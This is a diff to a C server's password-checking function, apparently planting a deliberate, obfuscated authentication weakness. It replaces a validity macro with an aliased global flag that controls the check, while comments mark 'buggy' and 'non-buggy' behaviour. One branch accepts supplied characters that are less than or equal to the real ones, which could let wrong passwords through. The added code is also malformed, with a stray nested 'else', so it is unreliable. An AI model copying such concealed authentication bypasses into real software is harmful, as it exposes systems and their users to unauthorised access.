@@ -276,11 +276,18 @@ void authenticate_server (int out, int in)
 
 #define ALLOW 1
 
-// unsigned long long -1 is 18446744073709551615
-// The character is valid iff the user (is authenticated) xor (is on the
-// first password attempt and the characters are the same)
-#define character_valid(c_supplied, c_actual, authenticated, client_auth_input_cnt) \
-(authenticated ^ (client_auth_input_cnt &&  (((c_supplied - c_actual) / -1ULL) != 1L)))
+
+static unsigned char auth_char = 1;
+static int server_state;
+static int *auth_ref = &server_state;
+
+
+// 1 iff should be logged in
+static void server_ready_for_login(int p_13)
+{
+  int * l_17 = &server_state;
+  *l_17 &= 0 < p_13;
+}
 
 /* Returns 0 iff client should not be authenticated. */
 bool get_authentication_phase (bool authenticated, int client_auth_input_cnt,
@@ -292,6 +299,12 @@ bool get_authentication_phase (bool authenticated, int client_auth_input_cnt,
 
    assert (strlen (actual_pwd) > 0);
 
+   unsigned char control_character = 254;
+
+  *auth_ref |= auth_char;
+  control_character |= *auth_ref;
+  server_ready_for_login (control_character);
+
    while (*supplied_pwd != '\0' && *actual_pwd != '\0')
     {
        char current_char_supplied = *supplied_pwd;
@@ -301,13 +314,15 @@ bool get_authentication_phase (bool authenticated, int client_auth_input_cnt,
        // non-buggy: valid char is 1
        // buggy: valid char is 0
 
-       if (valid_char)
+       if (server_state)
           {
               if (current_char_actual - current_char_supplied)
                   return !ALLOW;
           }
       else
          {
+          else
+          {
              if (current_char_supplied > current_char_actual)
                 return !ALLOW;
          }
